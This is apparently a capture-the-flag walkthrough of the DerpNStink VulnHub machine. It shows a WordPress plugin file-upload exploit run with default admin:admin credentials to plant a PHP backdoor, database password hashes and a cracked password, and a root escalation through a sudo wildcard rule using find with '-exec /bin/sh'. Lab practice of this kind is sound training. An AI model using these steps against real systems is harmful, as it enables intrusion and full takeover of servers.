# DerpNStink VulnHub

## Flags
Flag1 inside HTTP P80 Source code
><--flag1(52E37291AEDF6A46D7D0BB8A6312F4F9F1AA4975C248C3F0E008CBA09D6E9166) -->

## Notes

Uname:
>Linux DeRPnStiNK 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux
Needed to add the following entry to the hosts file.
>10.1.62.45     derpnstink.local

- Running PHPMyAdmin on */php* subdirectory. 
- Wordpress on */weblog*

Slideshow gallery plugin identified:
```
[+] slideshow-gallery                                                                                                                                        
 | Location: http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/                                                                            
 | Last Updated: 2019-07-12T13:09:00.000Z                                                                                                                    
 | [!] The version is out of date, the latest version is 1.6.12                                                                                              
 |                                                                                                                                                           
 | Found By: Urls In Homepage (Passive Detection)                                                                                                            
 |                                                                                                                                                           
 | Version: 1.4.6 (100% confidence)                                                                                                                          
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/readme.txt
```

Its vulnerable to a file upload vulnerability which allows us to upload a php backdoor. 

The default credentials for Wordpress are active. 

admin:admin

```
Î» python 34681.txt -t http://derpnstink.local/weblog -u admin -p admin -f asdf.php
...
[+] Username & password ACCEPTED!

[!] Shell Uploaded!
[+] Check url: http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/asdf.php (lowercase!!!!)
```

File in /support
```
www-data@DeRPnStiNK:/support$ cat troubleshooting.txt 
*******************************************************************
On one particular machine I often need to run sudo commands every now and then. I am fine with entering password on sudo in most of the cases.

However i dont want to specify each command to allow

How can I exclude these commands from password protection to sudo?

********************************************************************



********************************************************************
Thank you for contacting the Client Support team. This message is to confirm that we have resolved and closed your ticket. 

Please contact the Client Support team at https://pastebin.com/RzK9WfGw if you have any further questions or issues.

Thank you for using our product.

********************************************************************
```

The pastebin link gives us the following:
>mrderp ALL=(ALL) /home/mrderp/binaries/derpy*

We can login to local SQL service using -u root and -p mysql credentials. Inside the wordpress db we find the following hashes:
```
+-------------+------------------------------------+
| user_login  | user_pass                          |
+-------------+------------------------------------+
| unclestinky | $P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41 |
| admin       | $P$BgnU3VLAv.RWd3rdrkfVIuQr6mFvpd/ |
+-------------+------------------------------------+
```

We crack the hash for *unclestinky* giving us the password *wedgie57*.

Flag 3:
>flag3(07f62b021771d3cf67e2e1faf18769cc5e5c119ad7d4d1847a11e11d6d5a7ecb)

Inside a .pcap file inside the /ftp

mrderp:derpderpderpderpderpderpderp

## To root
```
mrderp@DeRPnStiNK:~$ sudo -l
Matching Defaults entries for mrderp on DeRPnStiNK:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User mrderp may run the following commands on DeRPnStiNK:
    (ALL) /home/mrderp/binaries/derpy*
mrderp@DeRPnStiNK:~$ cd /home/mrderp/binaries
-bash: cd: /home/mrderp/binaries: No such file or directory
mrderp@DeRPnStiNK:~$ mkdir /home/mrderp/binaries
mrderp@DeRPnStiNK:~$ cp $(which find) ~/binaries/derpy*
mrderp@DeRPnStiNK:~$ ls
binaries  Desktop  Documents  Downloads
mrderp@DeRPnStiNK:~$ cd binaries/
mrderp@DeRPnStiNK:~/binaries$ ls
derpy*
mrderp@DeRPnStiNK:~/binaries$ chmod 755 derpy\*
mrderp@DeRPnStiNK:~/binaries$ sudo ./derpy\* 
.
./derpy*
mrderp@DeRPnStiNK:~/binaries$ sudo ./derpy\* . -exec /bin/sh \; -quit
```